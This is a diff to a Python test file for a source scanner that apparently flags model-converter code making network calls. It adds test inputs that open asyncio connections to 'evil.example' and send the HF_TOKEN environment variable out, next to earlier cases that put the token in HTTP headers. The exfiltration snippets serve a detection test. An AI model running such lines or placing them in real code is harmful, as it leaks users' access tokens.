@@ -4517,14 +4517,26 @@ def test_a_client_that_names_a_bare_host_refuses_the_hub_allowance():
         'c.putrequest("GET", "/")\n'
         'c.putheader("a", os.environ["HF_TOKEN"])\nc.endheaders()\n',
         'from urllib import request\nrequest.urlopen("http://evil.example")\n',
+        # asyncio is imported for all sorts of reasons, so the refusal is on
+        # the connection API rather than on the module: open_connection(
+        # "evil.example", 443) names a host and writelines is not a write this
+        # rule knows.
+        'import asyncio\n'
+        'reader, writer = asyncio.open_connection("evil.example", 443)\n'
+        'writer.writelines([os.environ["HF_TOKEN"].encode()])\n',
+        'from asyncio import open_connection as oc\noc("evil.example", 443)\n',
     ):
         assert [
             f.check for f in scan_converter_source(preamble + body + download)
         ], body
 
-    # An ordinary member of an ordinary module is not one of these.
+    # An ordinary member of an ordinary module is not one of these, and
+    # neither is asyncio itself.
     assert scan_converter_source(
         preamble + 'from os import path\n' + download
+    ) == []
+    assert scan_converter_source(
+        preamble + 'import asyncio\nasyncio.run(main())\n' + download
     ) == []
 
     # The download on its own is what the allowance is for.
